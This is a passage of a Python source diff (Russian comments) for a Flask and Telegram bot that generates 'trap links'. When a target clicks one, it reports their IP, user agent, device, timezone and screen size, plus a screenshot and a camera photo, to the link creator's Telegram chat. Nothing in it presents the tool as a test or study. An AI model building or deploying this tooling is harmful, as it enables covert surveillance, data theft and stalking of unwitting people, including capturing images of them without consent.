+            f"🕒 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"⚠️ *Внимание:* При переходе по ссылке:\n"
+            f"• Будет сделан скриншот экрана\n"
+            f"• Будет попытка сделать фото с камеры\n"
+            f"• Вся информация придет сюда"
+        )
+        
+        bot.send_message(
+            chat_id,
+            message,
+            parse_mode='Markdown'
+        )
+        
+        # Отправляем QR-код
+        send_telegram_qr_code(chat_id, full_url, "QR-код для вашей ссылки")
+        
+        return True
+    except Exception as e:
+        print(f"Ошибка отправки уведомления о создании ссылки: {e}")
+        return False
+
+def send_telegram_click_notification(chat_id, link_id, name, click_count, ip, user_agent):
+    """Отправка уведомления о клике по ссылке"""
+    try:
+        message = (
+            f"🎯 *НОВЫЙ ПЕРЕХОД ПО ВАШЕЙ ССЫЛКЕ!*\n\n"
+            f"📝 Ссылка: {name}\n"
+            f"🆔 ID: `{link_id}`\n"
+            f"👤 Всего переходов: {click_count}\n\n"
+            f"🌐 *Информация о цели:*\n"
+            f"• IP: `{ip}`\n"
+            f"• Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"• User-Agent: {user_agent}..."
+        )
+        
+        bot.send_message(
+            chat_id,
+            message,
+            parse_mode='Markdown'
+        )
+        return True
+    except Exception as e:
+        print(f"Ошибка отправки уведомления о клике: {e}")
+        return False
+
+def send_telegram_browser_info(chat_id, trap_id, browser_info):
+    """Отправка информации о браузере"""
+    try:
+        message = (
+            f"📱 *ИНФОРМАЦИЯ О БРАУЗЕРЕ ЦЕЛИ*\n\n"
+            f"🆔 ID ловушки: `{trap_id}`\n"
+            f"🆔 Session ID: `{browser_info.get('session_id', 'N/A')}`\n"
+            f"💻 *Устройство:*\n"
+            f"• Платформа: {browser_info.get('platform', 'Unknown')}\n"
+            f"• Язык: {browser_info.get('language', 'Unknown')}\n"
+            f"• Экран: {browser_info.get('screen_width')}x{browser_info.get('screen_height')}\n"
+            f"• User-Agent: {browser_info.get('user_agent', 'Unknown')[:100]}...\n\n"
+            f"🌍 *Локация:*\n"
+            f"• Часовой пояс: {browser_info.get('timezone', 'Unknown')}\n"
+            f"• URL: {browser_info.get('url', 'N/A')[:100]}..."
+        )
+        
+        bot.send_message(
+            chat_id,
+            message,
+            parse_mode='Markdown'
+        )
+        return True
+    except Exception as e:
+        print(f"Ошибка отправки browser info: {e}")
+        return False
+
+def send_telegram_image(chat_id, trap_id, image_type, image_path, session_id, browser_info_str):
+    """Отправка изображения в Telegram"""
+    try:
+        browser_info = json.loads(browser_info_str) if browser_info_str else {}
+        
+        caption = (
+            f"{'📸 СКРИНШОТ ЭКРАНА' if image_type == 'screenshot' else '📷 ФОТО С КАМЕРЫ'}\n\n"
+            f"🆔 ID ловушки: `{trap_id}`\n"
+            f"🆔 Session ID: `{session_id}`\n"
+            f"🕒 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"💻 Устройство: {browser_info.get('platform', 'Unknown')}"
+        )
+        
+        with open(image_path, 'rb') as photo:
+            bot.send_photo(
+                chat_id,
+                photo,
+                caption=caption,
+                parse_mode='HTML'
+            )
+        
+        return True
+        
+    except Exception as e:
+        print(f"Ошибка отправки изображения: {e}")
+        return False
+
+def send_telegram_capture_report(chat_id, trap_id, screenshot_captured, camera_captured):
+    """Отправка отчета о захвате"""
+    try:
+        message = (
+            f"📊 *ОТЧЕТ О ЗАХВАТЕ ДАННЫХ*\n\n"
+            f"🆔 ID ловушки: `{trap_id}`\n"
+            f"📸 Скриншот: {'✅ Успешно' if screenshot_captured else '❌ Не удалось'}\n"
+            f"📷 Камера: {'✅ Успешно' if camera_captured else '❌ Не удалось'}\n"
+            f"🕒 Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
+        bot.send_message(
+            chat_id,
+            message,
+            parse_mode='Markdown'
+        )
+        return True
+    except Exception as e:
+        print(f"Ошибка отправки отчета: {e}")
+        return False
+
+def send_telegram_qr_code(chat_id, url, caption):
+    """Отправка QR-кода в Telegram"""
+    try:
+        # Генерируем QR-код
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_L,
+            box_size=10,
+            border=4,
+        )
+        qr.add_data(url)
+        qr.make(fit=True)
+        
+        img = qr.make_image(fill_color="black", back_color="white")
+        
+        # Сохраняем во временный файл
+        temp_file = f"temp_qr_{chat_id}_{int(time.time())}.png"
+        img.save(temp_file)
+        
+        # Отправляем фото
+        with open(temp_file, 'rb') as photo:
+            bot.send_photo(
+                chat_id,
+                photo,
+                caption=caption
+            )
+        
+        # Удаляем временный файл
+        os.remove(temp_file)
+        
+        return True
+    except Exception as e:
+        print(f"Ошибка отправки QR-кода: {e}")
+        return False
+
+def send_telegram_link_message(chat_id, link, name):
+    """Отправка ссылки пользователю"""
+    try:
+        message = (
+            f"🔗 *ВАША ССЫЛКА*\n\n"
+            f"📝 Название: {name}\n"
+            f"🔗 Ссылка: `{link}`\n\n"
+            f"📱 *QR-код для быстрого доступа:*"
+        )
+        
+        bot.send_message(
+            chat_id,
+            message,
+            parse_mode='Markdown'
+        )
+        
+        # Отправляем QR-код
+        send_telegram_qr_code(chat_id, link, "Отсканируйте этот QR-код для быстрого перехода")
+        
+        return True
+    except Exception as e:
+        print(f"Ошибка отправки ссылки: {e}")
+        return False
+
+def send_login_link(chat_id, user_id_db, telegram_data):
+    """Отправка ссылки для входа на сайт."""
+    session_id = create_session(user_id_db, telegram_data)
+    login_url = f"{NGROK_URL}/api/telegram-login/{session_id}"
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🌐 Перейти на сайт", url=login_url))
+
+    instructions = (
+        f"🔐 *Вход по ссылке*\n\n"
+        f"1. Нажмите кнопку ниже.\n"
+        f"2. Или откройте ссылку вручную:\n"
+        f"`{login_url}`\n\n"
+        f"Ссылка действует {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+
+    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode='Markdown')
+    send_telegram_qr_code(chat_id, login_url, "QR-код для входа на сайт")
+
+def send_login_code_message(chat_id, user_id_db, telegram_data):
+    """Отправка одноразового кода для входа."""
+    print(f"🤖 Создание кода для chat_id {chat_id}")
+    code = create_login_code(user_id_db, telegram_data)
+    print(f"🤖 Код создан: {code}")
+    message = (
+        f"🔑 *Вход по коду*\n\n"
+        f"Ваш код: `{code}`\n\n"
+        f"Введите его на странице входа на сайте.\n"
+        f"Код действует {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+    print(f"🤖 Отправка сообщения с кодом в чат {chat_id}")
+    bot.send_message(chat_id, message, parse_mode='Markdown')
+    print(f"🤖 Сообщение с кодом отправлено")
+
+# ========== TELEGRAM БОТ КОМАНДЫ ==========
+
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    """Приветственное сообщение"""
+    print(f"🤖 Получена команда /start от пользователя {message.from_user.username} (ID: {message.from_user.id}, chat_id: {message.chat.id})")
+    
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+    username = message.from_user.username
+    first_name = message.from_user.first_name
+    last_name = message.from_user.last_name
+    
+    # Регистрируем/обновляем пользователя
+    user_id_db = create_or_update_user(chat_id, username, first_name, last_name)
+
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🔐 Войти на сайт")
+    markup.add("📋 Мои ссылки")
+    markup.add("ℹ️ Помощь")
+
+    welcome_text = (
+        f"👋 Привет, {first_name or 'пользователь'}!\n\n"
+        f"🤖 Я бот для генерации ссылок-ловушек.\n\n"
+        f"📋 *Что я умею:*\n"
+        f"• Создавать уникальные ссылки\n"
+        f"• Делать скриншот при переходе\n"
+        f"• Делать фото с камеры (если доступно)\n"
+        f"• Отправлять всё прямо сюда\n\n"
+        f"🔐 *Чтобы начать:*\n"
+        f"1. Нажмите кнопку 'Войти на сайт'\n"
+        f"2. Выберите вход по ссылке или по коду\n"
+        f"3. Откройте сайт в браузере и подтвердите вход\n\n"
+        f"🌐 *Сайт:* {NGROK_URL}\n"
+        f"🆔 *Ваш ID:* `{user_id_db}`"
+    )
+
+    bot.send_message(
+        chat_id,
+        welcome_text,
+        reply_markup=markup,
+        parse_mode='Markdown'
+    )
+    return
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("🔗 По ссылке", callback_data="login_method_link"),
+        types.InlineKeyboardButton("🔑 По коду", callback_data="login_method_code")
+    )
+
+    instructions = (
+        "🔐 *Выберите способ входа*\n\n"
+        "🔗 По ссылке: бот пришлет кнопку и QR-код.\n"
+        "🔑 По коду: бот пришлет одноразовый код, который нужно ввести на сайте.\n\n"
+        f"Оба варианта действуют {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+
+    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode='Markdown')
+    return
+    
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🔐 Войти на сайт")
+    markup.add("📋 Мои ссылки")
+    markup.add("ℹ️ Помощь")
+    
+    welcome_text = (
+        f"👋 Привет, {first_name or 'пользователь'}!\n\n"
+        f"🤖 Я бот для генерации ссылок-ловушек.\n\n"
+        f"📋 *Что я умею:*\n"
+        f"• Создавать уникальные ссылки\n"
+        f"• Делать скриншот при переходе\n"
+        f"• Делать фото с камеры (если доступно)\n"
+        f"• Отправлять всё прямо сюда\n\n"
+        f"🔐 *Чтобы начать:*\n"
+        f"1. Нажмите кнопку 'Войти на сайт'\n"
+        f"2. Выберите вход по ссылке или по коду\n"
+        f"3. Откройте сайт в браузере и подтвердите вход\n\n"
+        f"🌐 *Сайт:* {NGROK_URL}\n"
+        f"🆔 *Ваш ID:* `{user_id_db}`"
+    )
+    
+    bot.send_message(
+        chat_id,
+        welcome_text,
+        reply_markup=markup,
+        parse_mode='Markdown'
+    )
+
+@bot.message_handler(func=lambda m: m.text == "🔐 Войти на сайт")
+def login_to_website(message):
+    """Отправка ссылки для входа на сайт"""
+    print(f"🤖 Пользователь {message.from_user.username} нажал 'Войти на сайт'")
+    
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+    username = message.from_user.username
+    first_name = message.from_user.first_name
+    last_name = message.from_user.last_name
+    
+    # Регистрируем/обновляем пользователя
+    user_id_db = create_or_update_user(chat_id, username, first_name, last_name)
+    
+    # Создаем сессию
+    telegram_data = {
+        'id': user_id,
+        'username': username,
+        'first_name': first_name,
+        'last_name': last_name,
+        'chat_id': chat_id
+    }
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("🔗 По ссылке", callback_data="login_method_link"),
+        types.InlineKeyboardButton("🔑 По коду", callback_data="login_method_code")
+    )
+
+    instructions = (
+        "🔐 *Выберите способ входа*\n\n"
+        "🔗 По ссылке: бот пришлет кнопку и QR-код.\n"
+        "🔑 По коду: бот пришлет одноразовый код, который нужно ввести на сайте.\n\n"
+        f"Оба варианта действуют {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+
+    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode='Markdown')
+    return
+
+    session_id = create_session(user_id_db, telegram_data)
+    
+    # Ссылка для входа
+    login_url = f"{NGROK_URL}/api/telegram-login/{session_id}"
+    
+    # Создаем кнопку
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🌐 Перейти на сайт", url=login_url))
+    
+    # Отправляем инструкцию
+    instructions = (
+        f"🔐 *Ссылка для входа на сайт*\n\n"
+        f"1. Нажмите кнопку ниже\n"
+        f"2. Или перейдите по ссылке:\n"
+        f"`{login_url}`\n\n"
+        f"⚠️ *Внимание:*\n"
+        f"• Ссылка действительна 1 час\n"
+        f"• Не передавайте её другим\n"
+        f"• После входа вы сможете создавать ссылки"
+    )
+    
+    bot.send_message(
+        chat_id,
+        instructions,
+        reply_markup=markup,
+        parse_mode='Markdown'
+    )
+    
+    # Отправляем QR-код для входа
+    send_telegram_qr_code(chat_id, login_url, "QR-код для входа на сайт")
+
+@bot.message_handler(func=lambda m: m.text == "📋 Мои ссылки")
+def show_my_links(message):
+    """Показать ссылки пользователя"""
+    chat_id = message.chat.id
+    user = get_user_by_chat_id(chat_id)
+    
+    if not user:
+        bot.send_message(chat_id, "❌ Вы не зарегистрированы. Нажмите /start")
+        return
+    
+    links = get_user_links(user['user_id'])
+    
+    if not links:
+        bot.send_message(chat_id, "📭 У вас пока нет созданных ссылок")
+        return
+    
+    # Отправляем первую ссылку с кнопками
+    link = links[0]
+    full_url = f"{NGROK_URL}/red/{link['link_id']}"
+    
+    text = (
+        f"🔗 *Ваша ссылка*\n\n"
+        f"📝 Название: {link['name'] or 'Без названия'}\n"
+        f"🆔 ID: `{link['link_id']}`\n"
+        f"👆 Переходов: {link['clicks']}\n"
+        f"📅 Создана: {link['created_at'][:10]}\n"
+        f"🔗 Ссылка: `{full_url}`"
+    )
+    
+    markup = types.InlineKeyboardMarkup()
+    
+    # Кнопка для копирования
+    markup.add(types.InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link['link_id']}"))
+    
+    # Кнопка для просмотра QR-кода
+    markup.add(types.InlineKeyboardButton("📱 QR-код", callback_data=f"qr_{link['link_id']}"))
+    
+    # Кнопка для просмотра следующей
+    if len(links) > 1:
+        text += f"\n\nПоказана последняя ссылка из {len(links)}. Остальные доступны в веб-интерфейсе."
+    
+    bot.send_message(
+        chat_id,
+        text,
+        reply_markup=markup,
+        parse_mode='Markdown'
+    )
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_all_callbacks(call):
+    """Обработка всех callback запросов"""
+    print(f"🤖 === CALLBACK ПОЛУЧЕН ===")
+    print(f"🤖 Callback data: '{call.data}'")
+    print(f"🤖 От пользователя: @{call.from_user.username} (ID: {call.from_user.id})")
+    print(f"🤖 Chat ID: {call.message.chat.id}")
+    print(f"🤖 Message ID: {call.message.message_id}")
+    print(f"🤖 Timestamp: {call.message.date}")
+    print(f"🤖 =======================")
+    
+    if call.data in ('login_method_link', 'login_method_code'):
+        login_method_callback(call)
+    elif call.data.startswith('copy_'):
+        # Обработка копирования
+        pass
+    elif call.data.startswith('qr_'):
+        # Обработка QR
+        pass
+    else:
+        print(f"🤖 Неизвестный callback: {call.data}")
+
+def login_method_callback(call):
+    """Выбор способа входа на сайт."""
+    print(f"🤖 === ОБРАБОТКА ВЫБОРА МЕТОДА ВХОДА ===")
+    print(f"🤖 Callback: {call.data}")
+    print(f"🤖 Пользователь: @{call.from_user.username} (ID: {call.from_user.id})")
+    
+    chat_id = call.message.chat.id
+    user = call.from_user
+    print(f"🤖 Создание/обновление пользователя в БД...")
+    user_id_db = create_or_update_user(chat_id, user.username, user.first_name, user.last_name)
+    print(f"🤖 Пользователь в БД: ID {user_id_db}")
+    
+    telegram_data = {
+        'id': user.id,
+        'username': user.username,
+        'first_name': user.first_name,
+        'last_name': user.last_name,
+        'chat_id': chat_id
+    }
+
+    if call.data == 'login_method_link':
+        print(f"🤖 Отправка ссылки пользователю {user.username}")
+        send_login_link(chat_id, user_id_db, telegram_data)
+        bot.answer_callback_query(call.id, "Ссылка для входа отправлена")
+        print(f"🤖 ✅ Ссылка отправлена")
+    else:
+        print(f"🤖 Отправка кода пользователю {user.username}")
+        send_login_code_message(chat_id, user_id_db, telegram_data)
+        bot.answer_callback_query(call.id, "Код для входа отправлен")
+        print(f"🤖 ✅ Код отправлен")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
+def copy_link_callback(call):
+    """Копирование ссылки"""
+    link_id = call.data[5:]
+    link = get_link(link_id)
+    
+    if link:
+        full_url = f"{NGROK_URL}/red/{link_id}"
+        bot.answer_callback_query(call.id, f"✅ Ссылка скопирована!\n{full_url[:30]}...", show_alert=False)
+    else:
+        bot.answer_callback_query(call.id, "❌ Ссылка не найдена", show_alert=True)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('qr_'))
+def qr_code_callback(call):
+    """Показать QR-код ссылки"""
+    link_id = call.data[3:]
+    link = get_link(link_id)
+    
+    if link:
+        full_url = f"{NGROK_URL}/red/{link_id}"
+        send_telegram_qr_code(call.message.chat.id, full_url, f"QR-код для ссылки: {link['name'] or 'Без названия'}")
+        bot.answer_callback_query(call.id, "✅ QR-код отправлен!")
+    else:
+        bot.answer_callback_query(call.id, "❌ Ссылка не найдена", show_alert=True)
+
+# ========== ЗАПУСК ==========
+
+def run_bot():
+    """Запуск Telegram бота"""
+    print("🤖 Запуск Telegram бота...")
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=0, timeout=20)
+        except Exception as e:
+            print(f"Ошибка бота: {e}")
+            time.sleep(5)
+
+if __name__ == '__main__':
+    # Инициализация базы данных
+    init_db()
+    cleanup_expired_links()
+    cleanup_expired_sessions()
+    
+    # Запуск бота в отдельном потоке
+    bot_thread = Thread(target=run_bot, daemon=True)
+    bot_thread.start()
+    cleanup_thread = Thread(target=background_cleanup_worker, daemon=True)
+    cleanup_thread.start()
+    
+    print("=" * 60)
+    print("🕵️‍♂️ ГЕНЕРАТОР ССЫЛОК-ЛОВУШЕК С TELEGRAM АВТОРИЗАЦИЕЙ")
+    print("=" * 60)
+    print(f"🌐 Внешний URL: {NGROK_URL}")
+    print(f"🏠 Локальный URL: http://localhost:8080")
+    print("🤖 Telegram бот запущен")
+    print("🔐 Авторизация через Telegram активирована")
+    print("🍪 Постоянные сессии на 90 дней")
+    print("=" * 60)
+    print("📋 Установите зависимости:")
+    print("   pip install flask flask-session telebot requests qrcode[pil] pillow")
+    print("=" * 60)
+    print("🚀 Сервер запущен. После перезапуска сервера:")
+    print("   • Пользователи останутся авторизованными")
+    print("   • Все ссылки сохранятся")
+    print("   • Сессии будут восстановлены из базы данных")
+    print("=" * 60)
+    
+    app.run(host='0.0.0.0', port=8080, debug=False, threaded=True, use_reloader=False)
